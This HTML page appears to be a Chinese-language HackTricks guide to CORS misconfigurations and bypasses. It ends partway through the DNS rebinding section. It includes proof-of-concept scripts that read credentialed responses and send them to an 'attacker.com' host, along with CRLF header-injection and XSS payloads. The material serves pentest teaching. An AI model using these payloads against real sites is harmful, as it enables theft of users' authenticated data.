<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CORS - Misconfigurations &amp; Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="cors---misconfigurations--bypass"><a class="header" href="#cors---misconfigurations--bypass">CORS - Misconfigurations &amp; Bypass</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="什么是-cors"><a class="header" href="#什么是-cors">什么是 CORS？</a></h2>
<p>跨源资源共享 (CORS) 标准 <strong>使服务器能够定义谁可以访问其资产</strong> 和 <strong>哪些 HTTP 请求方法被允许</strong> 来自外部来源。</p>
<p><strong>同源</strong> 策略要求 <strong>请求</strong> 资源的服务器和托管 <strong>资源</strong> 的服务器共享相同的协议（例如，<code>http://</code>）、域名（例如，<code>internal-web.com</code>）和 <strong>端口</strong>（例如，80）。在此策略下，仅允许来自同一域和端口的网页访问资源。</p>
<p>在 <code>http://normal-website.com/example/example.html</code> 的上下文中，同源策略的应用如下所示：</p>
<div class="table-wrapper"><table><thead><tr><th>访问的 URL</th><th>是否允许访问？</th></tr></thead><tbody>
<tr><td><code>http://normal-website.com/example/</code></td><td>是：相同的协议、域名和端口</td></tr>
<tr><td><code>http://normal-website.com/example2/</code></td><td>是：相同的协议、域名和端口</td></tr>
<tr><td><code>https://normal-website.com/example/</code></td><td>否：不同的协议和端口</td></tr>
<tr><td><code>http://en.normal-website.com/example/</code></td><td>否：不同的域名</td></tr>
<tr><td><code>http://www.normal-website.com/example/</code></td><td>否：不同的域名</td></tr>
<tr><td><code>http://normal-website.com:8080/example/</code></td><td>否：不同的端口*</td></tr>
</tbody></table>
</div>
<p>*Internet Explorer 在执行同源策略时忽略端口号，因此允许此访问。</p>
<h3 id="access-control-allow-origin-头"><a class="header" href="#access-control-allow-origin-头"><code>Access-Control-Allow-Origin</code> 头</a></h3>
<p>此头可以允许 <strong>多个源</strong>、<strong><code>null</code></strong> 值或通配符 <strong><code>*</code></strong>。然而，<strong>没有浏览器支持多个源</strong>，并且通配符 <code>*</code> 的使用受到 <strong>限制</strong>。（通配符必须单独使用，且与 <code>Access-Control-Allow-Credentials: true</code> 一起使用是不允许的。）</p>
<p>此头是 <strong>由服务器发出</strong> 的，以响应由网站发起的跨域资源请求，浏览器会自动添加 <code>Origin</code> 头。</p>
<h3 id="access-control-allow-credentials-头"><a class="header" href="#access-control-allow-credentials-头"><code>Access-Control-Allow-Credentials</code> 头</a></h3>
<p><strong>默认情况下</strong>，跨源请求是在没有凭据（如 cookies 或 Authorization 头）的情况下进行的。然而，跨域服务器可以通过将 <code>Access-Control-Allow-Credentials</code> 头设置为 <strong><code>true</code></strong> 来允许在发送凭据时读取响应。</p>
<p>如果设置为 <code>true</code>，浏览器将传输凭据（cookies、授权头或 TLS 客户端证书）。</p>
<pre><code class="language-javascript">var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
</code></pre>
<pre><code class="language-javascript">fetch(url, {
credentials: 'include'
})
</code></pre>
<pre><code class="language-javascript">const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;');
</code></pre>
<h3 id="csrf-预检请求"><a class="header" href="#csrf-预检请求">CSRF 预检请求</a></h3>
<h3 id="理解跨域通信中的预检请求"><a class="header" href="#理解跨域通信中的预检请求">理解跨域通信中的预检请求</a></h3>
<p>在特定条件下发起跨域请求时，例如使用 <strong>非标准 HTTP 方法</strong>（除了 HEAD、GET、POST 以外的任何方法）、引入新的 <strong>头部</strong>，或使用特殊的 <strong>Content-Type 头部值</strong>，可能需要进行预检请求。这个初步请求利用 <strong><code>OPTIONS</code></strong> 方法，旨在通知服务器即将到来的跨源请求的意图，包括它打算使用的 HTTP 方法和头部。</p>
<p><strong>跨源资源共享 (CORS)</strong> 协议要求进行此预检检查，以通过验证允许的方法、头部和来源的可信度来确定请求的跨源操作的可行性。有关哪些条件可以绕过预检请求的详细理解，请参考 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests"><strong>Mozilla Developer Network (MDN)</strong></a> 提供的综合指南。</p>
<p>需要注意的是，<strong>缺少预检请求并不意味着响应不需要携带授权头部</strong>。没有这些头部，浏览器将无法处理来自跨源请求的响应。</p>
<p>考虑以下示例，展示了一个旨在使用 <code>PUT</code> 方法和名为 <code>Special-Request-Header</code> 的自定义头部的预检请求：</p>
<pre><code>OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
</code></pre>
<p>作为响应，服务器可能会返回指示接受的方法、允许的来源和其他CORS政策细节的头部，如下所示：</p>
<pre><code class="language-markdown">HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
</code></pre>
<ul>
<li><strong><code>Access-Control-Allow-Headers</code></strong>: 此头部指定在实际请求中可以使用哪些头部。它由服务器设置，以指示客户端请求中允许的头部。</li>
<li><strong><code>Access-Control-Expose-Headers</code></strong>: 通过此头部，服务器通知客户端哪些头部可以作为响应的一部分被暴露，除了简单的响应头部。</li>
<li><strong><code>Access-Control-Max-Age</code></strong>: 此头部指示预检请求的结果可以缓存多长时间。服务器设置预检请求返回的信息可以重用的最大时间（以秒为单位）。</li>
<li><strong><code>Access-Control-Request-Headers</code></strong>: 在预检请求中使用，此头部由客户端设置，以通知服务器客户端希望在实际请求中使用哪些HTTP头部。</li>
<li><strong><code>Access-Control-Request-Method</code></strong>: 此头部也在预检请求中使用，由客户端设置，以指示在实际请求中将使用哪个HTTP方法。</li>
<li><strong><code>Origin</code></strong>: 此头部由浏览器自动设置，指示跨源请求的来源。服务器使用它来评估根据CORS策略是否应允许或拒绝传入请求。</li>
</ul>
<p>请注意，通常情况下（取决于内容类型和设置的头部）在<strong>GET/POST请求中不会发送预检请求</strong>（请求是<strong>直接</strong>发送的），但如果您想访问<strong>响应的头部/主体</strong>，它必须包含一个允许的 <em>Access-Control-Allow-Origin</em> 头部。<br />
<strong>因此，CORS并不能防止CSRF（但它可能有帮助）。</strong></p>
<h3 id="本地网络请求预检请求"><a class="header" href="#本地网络请求预检请求"><strong>本地网络请求预检请求</strong></a></h3>
<ol>
<li><strong><code>Access-Control-Request-Local-Network</code></strong>: 此头部包含在客户端的请求中，以表明该请求是针对本地网络资源的。它作为一个标记，通知服务器请求源自本地网络内。</li>
<li><strong><code>Access-Control-Allow-Local-Network</code></strong>: 作为响应，服务器利用此头部来传达请求的资源被允许与本地网络外的实体共享。它作为跨越不同网络边界共享资源的绿灯，确保在维护安全协议的同时实现受控访问。</li>
</ol>
<p>一个<strong>有效的响应允许本地网络请求</strong>还需要在响应中包含头部 <code>Access-Controls-Allow-Local_network: true</code> :</p>
<pre><code>HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
</code></pre>
<p>{% hint style="warning" %}
请注意，linux <strong>0.0.0.0</strong> IP 可以用来 <strong>绕过</strong> 这些要求以访问 localhost，因为该 IP 地址不被视为“本地”。</p>
<p>如果使用 <strong>本地端点的公共 IP 地址</strong>（例如路由器的公共 IP），也可以 <strong>绕过本地网络要求</strong>。因为在多种情况下，即使正在访问 <strong>公共 IP</strong>，如果它是 <strong>来自本地网络</strong>，也会被授予访问权限。
{% endhint %}</p>
<h3 id="通配符"><a class="header" href="#通配符">通配符</a></h3>
<p>请注意，即使以下配置看起来非常宽松：</p>
<pre><code class="language-bash">Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
</code></pre>
<p>这在浏览器中是不允许的，因此凭据不会随请求发送。</p>
<h2 id="可利用的错误配置"><a class="header" href="#可利用的错误配置">可利用的错误配置</a></h2>
<p>已观察到将 <code>Access-Control-Allow-Credentials</code> 设置为 <strong><code>true</code></strong> 是大多数 <strong>真实攻击</strong> 的前提条件。此设置允许浏览器发送凭据并读取响应，从而增强攻击的有效性。如果没有这个，利用用户的 cookies 的好处就会减少，因为利用用户的 cookies 变得不可行。</p>
<h3 id="例外利用网络位置作为认证"><a class="header" href="#例外利用网络位置作为认证">例外：利用网络位置作为认证</a></h3>
<p>存在一个例外情况，即受害者的网络位置作为一种认证形式。这允许受害者的浏览器作为代理，绕过基于 IP 的认证以访问内网应用程序。这种方法在影响上与 DNS 重新绑定相似，但更容易利用。</p>
<h3 id="origin-在-access-control-allow-origin-中的反射"><a class="header" href="#origin-在-access-control-allow-origin-中的反射"><code>Origin</code> 在 <code>Access-Control-Allow-Origin</code> 中的反射</a></h3>
<p>在现实场景中，<code>Origin</code> 头的值反射在 <code>Access-Control-Allow-Origin</code> 中在理论上是不太可能的，因为对这些头的组合有限制。然而，寻求为多个 URL 启用 CORS 的开发者可能会通过复制 <code>Origin</code> 头的值动态生成 <code>Access-Control-Allow-Origin</code> 头。这种方法可能引入漏洞，特别是当攻击者使用一个看似合法的域名时，从而欺骗验证逻辑。</p>
<pre><code class="language-html">&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
&lt;/script&gt;
</code></pre>
<h3 id="利用-null-源"><a class="header" href="#利用-null-源">利用 <code>null</code> 源</a></h3>
<p><code>null</code> 源在重定向或本地 HTML 文件等情况中指定，具有独特的地位。一些应用程序将此源列入白名单以促进本地开发，无意中允许任何网站通过沙盒 iframe 模仿 <code>null</code> 源，从而绕过 CORS 限制。</p>
<pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
&lt;/script&gt;"&gt;&lt;/iframe&gt;
</code></pre>
<pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
&lt;/script&gt;"&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="正则表达式绕过技术"><a class="header" href="#正则表达式绕过技术">正则表达式绕过技术</a></h3>
<p>当遇到域名白名单时，测试绕过机会至关重要，例如将攻击者的域名附加到白名单域名或利用子域名接管漏洞。此外，用于域名验证的正则表达式可能会忽视域名命名规则中的细微差别，从而提供进一步的绕过机会。</p>
<h3 id="高级正则表达式绕过"><a class="header" href="#高级正则表达式绕过">高级正则表达式绕过</a></h3>
<p>正则表达式模式通常集中于字母数字、点 (.) 和连字符 (-) 字符，忽略其他可能性。例如，构造一个包含浏览器和正则表达式模式以不同方式解释的字符的域名，可以绕过安全检查。Safari、Chrome 和 Firefox 对子域名中下划线字符的处理说明了如何利用这些差异来规避域名验证逻辑。</p>
<p><strong>有关此绕过检查的更多信息和设置：</strong> <a href="https://www.corben.io/advanced-cors-techniques/"><strong>https://www.corben.io/advanced-cors-techniques/</strong></a> <strong>和</strong> <a href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397"><strong>https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397</strong></a></p>
<p><img src="../.gitbook/assets/image%20(284).png" alt="https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png" /></p>
<h3 id="从子域名中的-xss"><a class="header" href="#从子域名中的-xss">从子域名中的 XSS</a></h3>
<p>开发人员通常实施防御机制，以通过白名单允许请求信息的域名来保护免受 CORS 利用。尽管采取了这些预防措施，系统的安全性并非万无一失。在白名单域名中，即使存在一个脆弱的子域名，也可能通过其他漏洞（如 XSS（跨站脚本））打开 CORS 利用的大门。</p>
<p>例如，考虑一个场景，其中域名 <code>requester.com</code> 被列入白名单以访问另一个域名 <code>provider.com</code> 的资源。服务器端配置可能如下所示：</p>
<pre><code class="language-javascript">if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
</code></pre>
<p>在此设置中，<code>requester.com</code> 的所有子域都被允许访问。然而，如果一个子域，例如 <code>sub.requester.com</code>，存在 XSS 漏洞，攻击者可以利用这个弱点。例如，拥有 <code>sub.requester.com</code> 访问权限的攻击者可以利用 XSS 漏洞绕过 CORS 策略，恶意访问 <code>provider.com</code> 上的资源。</p>
<h3 id="特殊字符"><a class="header" href="#特殊字符"><strong>特殊字符</strong></a></h3>
<p>PortSwigger 的 <a href="https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet">URL 验证绕过备忘单</a> 发现某些浏览器支持域名中的奇怪字符。</p>
<p>Chrome 和 Firefox 支持下划线 <code>_</code>，可以绕过用于验证 <code>Origin</code> 头的正则表达式：</p>
<pre><code>GET / HTTP/2
Cookie: &lt;session_cookie&gt;
Origin: https://target.application_.arbitrary.com
</code></pre>
<pre><code>HTTP/2 200 OK
Access-Control-Allow-Origin: https://target.application_.arbitrary.com
Access-Control-Allow-Credentials: true
</code></pre>
<p>Safari 在接受域名中的特殊字符方面甚至更加宽松：</p>
<pre><code>GET / HTTP/2
Cookie: &lt;session_cookie&gt;
Origin: https://target.application}.arbitrary.com
</code></pre>
<pre><code>HTTP/2 200 OK
Cookie: &lt;session_cookie&gt;
Access-Control-Allow-Origin: https://target.application}.arbitrary.com
Access-Control-Allow-Credentials: true
</code></pre>
<h3 id="其他有趣的-url-技巧"><a class="header" href="#其他有趣的-url-技巧"><strong>其他有趣的 URL 技巧</strong></a></h3>
<p>{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
<a href="ssrf-server-side-request-forgery/url-format-bypass.html">url-format-bypass.md</a>
{% endcontent-ref %}</p>
<h3 id="服务器端缓存中毒"><a class="header" href="#服务器端缓存中毒"><strong>服务器端缓存中毒</strong></a></h3>
<p><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"><strong>来自这项研究</strong></a></p>
<p>通过 HTTP 头注入利用服务器端缓存中毒，可能会引发存储的跨站脚本 (XSS) 漏洞。当应用程序未能清理 <code>Origin</code> 头中的非法字符时，这种情况就会发生，特别是对 Internet Explorer 和 Edge 用户而言。这些浏览器将 (0x0d) 视为合法的 HTTP 头终止符，从而导致 HTTP 头注入漏洞。</p>
<p>考虑以下请求，其中 <code>Origin</code> 头被操纵：</p>
<pre><code>GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
</code></pre>
<p>Internet Explorer 和 Edge 将响应解释为：</p>
<pre><code>HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
</code></pre>
<p>虽然通过使网络浏览器发送格式错误的头部直接利用此漏洞并不可行，但可以使用像 Burp Suite 这样的工具手动生成一个精心制作的请求。此方法可能导致服务器端缓存保存响应，并无意中将其提供给其他人。精心制作的有效载荷旨在将页面的字符集更改为 UTF-7，这是一种字符编码，通常与 XSS 漏洞相关，因为它能够以某种方式编码字符，使其在特定上下文中可以作为脚本执行。</p>
<p>有关存储型 XSS 漏洞的进一步阅读，请参见 <a href="https://portswigger.net/web-security/cross-site-scripting/stored">PortSwigger</a>。</p>
<p><strong>注意</strong>：利用 HTTP 头注入漏洞，特别是通过服务器端缓存中毒，强调了验证和清理所有用户提供的输入（包括 HTTP 头）的重要性。始终采用强大的安全模型，包括输入验证，以防止此类漏洞。</p>
<h3 id="客户端缓存中毒"><a class="header" href="#客户端缓存中毒"><strong>客户端缓存中毒</strong></a></h3>
<p><a href="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"><strong>来自这项研究</strong></a></p>
<p>在这种情况下，观察到一个网页实例反映了未正确编码的自定义 HTTP 头的内容。具体而言，网页反映了包含在 <code>X-User-id</code> 头中的内容，这可能包括恶意 JavaScript，如示例所示，其中头部包含一个 SVG 图像标签，旨在在加载时执行 JavaScript 代码。</p>
<p>跨源资源共享 (CORS) 策略允许发送自定义头部。然而，由于 CORS 限制，响应未被浏览器直接呈现，这种注入的实用性似乎有限。关键点在于考虑浏览器的缓存行为。如果未指定 <code>Vary: Origin</code> 头，则恶意响应可能会被浏览器缓存。随后，当导航到该 URL 时，这个缓存的响应可能会被直接呈现，绕过初始请求时直接呈现的需要。此机制通过利用客户端缓存增强了攻击的可靠性。</p>
<p>为了说明此攻击，提供了一个 JavaScript 示例，旨在在网页环境中执行，例如通过 JSFiddle。该脚本执行一个简单的操作：它向指定的 URL 发送一个包含恶意 JavaScript 的自定义头的请求。在请求成功完成后，它尝试导航到目标 URL，如果响应在未正确处理 <code>Vary: Origin</code> 头的情况下被缓存，可能会触发注入脚本的执行。</p>
<p>以下是用于执行此攻击的 JavaScript 的简要分解：</p>
<pre><code class="language-html">&lt;script&gt;
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "&lt;svg/onload=alert(1)&gt;");
req.send();
&lt;/script&gt;
</code></pre>
<h2 id="bypass"><a class="header" href="#bypass">Bypass</a></h2>
<h3 id="xssi-cross-site-script-inclusion--jsonp"><a class="header" href="#xssi-cross-site-script-inclusion--jsonp">XSSI (Cross-Site Script Inclusion) / JSONP</a></h3>
<p>XSSI，也称为跨站脚本包含，是一种利用同源策略（SOP）在使用脚本标签包含资源时不适用的漏洞。这是因为脚本需要能够从不同域中包含。此漏洞允许攻击者访问和读取任何使用脚本标签包含的内容。</p>
<p>当涉及动态JavaScript或JSONP（带填充的JSON）时，这个漏洞尤其重要，特别是当使用像cookies这样的环境权限信息进行身份验证时。当从不同主机请求资源时，cookies会被包含，使攻击者可以访问。</p>
<p>为了更好地理解和缓解此漏洞，您可以使用可在<a href="https://github.com/kapytein/jsonp">https://github.com/kapytein/jsonp</a>找到的BurpSuite插件。此插件可以帮助识别和解决您Web应用程序中的潜在XSSI漏洞。</p>
<p><a href="xssi-cross-site-script-inclusion.html"><strong>在这里阅读有关不同类型的XSSI及其利用方式的更多信息。</strong></a></p>
<p>尝试在请求中添加一个**<code>callback</code>** <strong>参数</strong>。也许页面准备将数据作为JSONP发送。在这种情况下，页面将以<code>Content-Type: application/javascript</code>返回数据，从而绕过CORS策略。</p>
<p><img src="../.gitbook/assets/image%20(856).png" alt="" /></p>
<h3 id="简单无用绕过"><a class="header" href="#简单无用绕过">简单（无用？）绕过</a></h3>
<p>绕过<code>Access-Control-Allow-Origin</code>限制的一种方法是请求Web应用程序代表您发出请求并发送回响应。然而，在这种情况下，最终受害者的凭据不会被发送，因为请求是发往不同的域。</p>
<ol>
<li><a href="https://github.com/shalvah/cors-escape"><strong>CORS-escape</strong></a>：此工具提供一个代理，转发您的请求及其头，同时伪造Origin头以匹配请求的域。这有效地绕过了CORS政策。以下是使用XMLHttpRequest的示例：</li>
<li><a href="https://github.com/shalvah/simple-cors-escape"><strong>simple-cors-escape</strong></a>：此工具提供了一种替代的请求代理方法。服务器不是直接传递您的请求，而是使用指定的参数发出自己的请求。</li>
</ol>
<h3 id="iframe--popup绕过"><a class="header" href="#iframe--popup绕过">Iframe + Popup绕过</a></h3>
<p>您可以通过<strong>创建一个iframe</strong>并<strong>从中打开一个新窗口</strong>来<strong>绕过CORS检查</strong>，例如<code>e.origin === window.origin</code>。更多信息请参见以下页面：</p>
<p>{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
<a href="xss-cross-site-scripting/iframes-in-xss-and-csp.html">iframes-in-xss-and-csp.md</a>
{% endcontent-ref %}</p>
<h3 id="通过ttl进行dns重绑定"><a class="header" href="#通过ttl进行dns重绑定">通过TTL进行DNS重绑定</a></h3>
<p>通过TTL进行DNS重绑定是一种通过操纵DNS记录来绕过某些安全措施的技术。其工作原理如下：</p>
<ol>
<li>攻击者创建一个网页并使受害者访问它。</li>
<li>攻击者然后更改其自己域的DNS（IP）以指向受害者的网页。</li>
<li>受害者的浏览器缓存DNS响应，可能具有TTL（生存时间）值，指示DNS记录应被视为有效的时间。</li>
<li>当TTL过期时，受害者的浏览器发出新的DNS请求，允许攻击者在受害者的页面上执行JavaScript代码。</li>
<li>通过保持对受害者IP的控制，攻击者可以在不向受害者服务器发送任何cookies的情况下收集受害者的信息。</li>
</ol>
<p>需要注意的是，浏览器具有缓存机制，可能会阻止立即滥用此技术，即使TTL值较低。</p>
<p>DNS重绑定对于绕过受害者执行的显式IP检查或用户或机器人在同一页面上停留较长时间的场景非常有用，从而允许缓存过期。</p>
<p>如果您需要快速滥用DNS重绑定，可以使用像<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a>这样的服务。</p>
<p>要运行自己的DNS重绑定服务器，您可以利用像<strong>DNSrebinder</strong>（<a href="https://github.com/mogwailabs/DNSrebinder">https://github.com/mogwailabs/DNSrebinder</a>）这样的工具。这涉及到暴露您的本地端口53/udp，创建一个指向它的A记录（例如，ns.example.com），并创建一个指向先前创建的A子域的NS记录（例如，ns.example.com）。ns.example.com子域的任何子域将由您的主机解析。</p>
<p>您还可以访问<a href="http://rebind.it/singularity.html">http://rebind.it/singularity.html</a>上的公共运行服务器以进一步理解和实验。</p>
<h3 id="通过dns缓存洪水进行dns重绑定"><a class="header" href="#通过dns缓存洪水进行dns重绑定">通过<strong>DNS缓存洪水</strong>进行DNS重绑定</a></h3>
<p>通过DNS缓存洪水进行DNS重绑定是另一种用于绕过浏览器缓存机制并强制第二个DNS请求的技术。其工作原理如下：</p>
<ol>
<li>最初，当受害者发出DNS请求时，响应为攻击者的IP地址。</li>
<li>为了绕过缓存防御，攻击者利用服务工作者。服务工作者洪水式地填充DNS缓存，这有效地删除了缓存的攻击者服务器名称。</li>
<li>当受害者的浏览器发出第二个DNS请求时，现在响应为IP地址127.0.0.1，这通常指的是本地主机。</li>
</ol>
<p>通过用服务工作者填充DNS缓存，攻击者可以操纵DNS解析过程并强制受害者的浏览器发出第二个请求，这次解析为攻击者所需的IP地址。</p>
<h3 id="通过缓存进行dns重绑定"><a class="header" href="#通过缓存进行dns重绑定">通过<strong>缓存</strong>进行DNS重绑定</a></h3>
<p>绕过缓存防御的另一种方法是为DNS提供商中的同一子域利用多个IP地址。其工作原理如下：</p>
<ol>
<li>攻击者在DNS提供商中为同一子域设置两个A记录（或一个具有两个IP的单个A记录）。</li>
